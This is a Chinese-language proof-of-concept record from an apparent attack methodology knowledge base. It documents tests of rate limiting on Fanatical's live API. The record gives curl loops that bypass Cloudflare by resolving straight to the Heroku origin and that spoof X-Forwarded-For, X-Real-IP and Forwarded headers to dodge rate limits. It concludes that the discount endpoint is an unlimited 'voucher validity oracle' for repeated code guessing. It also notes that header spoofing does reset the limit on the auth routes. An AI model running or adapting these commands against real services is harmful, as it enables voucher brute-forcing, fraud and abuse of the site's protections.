# Fanatical API 令牌桶实测：redeem-code 路由族无法用伪造 XFF/X-Real-IP/Forwarded 换桶，discount 路由族无限速

- **code**: fanatical-api-令牌桶实测-redeem-code-路由族无法用伪造-xff-x-real-ip-forwa
- **kind**: poc
- **category**: methodology
- **component**: Fanatical 主站 API（Heroku/Express + Cloudflare Worker）
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 于 www.fanatical.com 实测（curl --noproxy '*' --resolve admin.fanatical.com:443:3.33.161.45 -H 'Host: admin.fanatical.com' 直连 Heroku 源站）：①/api/discount 无 XFF 连续 8 次 + 10 个不同 X-Forwarded-For 连续 10 次全部 HTTP 400 业务响应，无 429；②/api/redeem-code/search 无 XFF 8 次、不同 XFF 10 次、X-Real-IP:8.8.8.8、Forwarded:for=8.8.8.8、Client-IP:8.8.8.8、XFF 公网链全部 HTTP 429 len=0；经 CF Worker 带 XFF 亦 429；apistaging 实例同样 429；429 响应头 server: Heroku、无 Retry-After/RateLimit-*。对照组：同一套直连方式 + 伪造 XFF 在 /api/auth/* 上可换新桶（finding#1636，另条）。
- **path**: pocs/fanatical-api-令牌桶实测-redeem-code-路由族无法用伪造-xff-x-real-ip-forwa/poc.txt
- **tags**: fanatical,rate-limit,token-bucket,xff,negative,redeem-code,discount
- **created_at**: 2026-11-11T17:15:58.326Z
- **engine**: https://www.fanatical.com/api/redeem-code/search

## 描述

Fanatical 应用层令牌桶按【应用实例 × 源 IP × 路由族】隔离；在 redeem-code 路由族上，客户端 IP 头（X-Forwarded-For / X-Real-IP / Forwarded / Client-IP）均不能改变桶键，伪造后仍 429；而 discount 路由族完全无限速。用于判断：遇到 redeem/redeem-code 相关接口 429 时，换 IP 头无效，只能等窗口；discount 类接口可无限重试。

## 正文

```
## 复现（本机，2026-11-11）

```bash
UA="$ARTEX_UA"; A='anonid: 11111111-1111-4111-8111-111111111111'
# 直连 Heroku 源站（绕过 CF Worker）
H=(--noproxy '*' -A "$UA" -H 'Host: admin.fanatical.com' -H 'Content-Type: application/json' -H "$A" --resolve admin.fanatical.com:443:3.33.161.45)

# ① discount 族：无 XFF 8 次 + 10 个不同 XFF 10 次 → 全 400（无限速）
for i in $(seq 1 8); do curl -sk "${H[@]}" -X POST https://admin.fanatical.com/api/discount -d '{"discountCode":"ZZZTEST"}' -o /dev/null -w '%{http_code}\n'; done
for i in $(seq 1 10); do curl -sk "${H[@]}" -H "X-Forwarded-For: 203.0.113.$i" -X POST https://admin.fanatical.com/api/discount -d '{"discountCode":"ZZZTEST"}' -o /dev/null -w '%{http_code}\n'; done
# → 18/18 = 400

# ② redeem-code 族：无 XFF 8 次 + 10 个不同 XFF 10 次 + X-Real-IP/Forwarded/Client-IP → 全 429 len=0
for i in $(seq 1 10); do curl -sk "${H[@]}" -H "X-Forwarded-For: 198.51.100.$i" -X POST https://admin.fanatical.com/api/redeem-code/search -d '{"code":"TESTCODE1234"}' -o /dev/null -w '%{http_code} %{size_download}\n'; done
# → 429 0 × 10
```

## 429 响应头
```
HTTP/2 429
server: Heroku
cache-control: private, no-cache, no-store, must-revalidate
(无 Retry-After / 无 RateLimit-*)
```
→ 应用层限速器，非 Cloudflare/Heroku router；窗口长度不回显。

## 结论
- redeem-code 路由族：XFF 等 IP 头伪造**不能**换桶（当前窗口耗尽后持续 429，跨实例 apistaging 同样）。
- discount 路由族：**无限速**，可反复调用（voucher 有效性 oracle 随时可用）。
- 遇 redeem 族 429 只能等窗口恢复（fact#695：apistaging 约 2-3 分钟、www 更长 ≥10 分钟）。
```
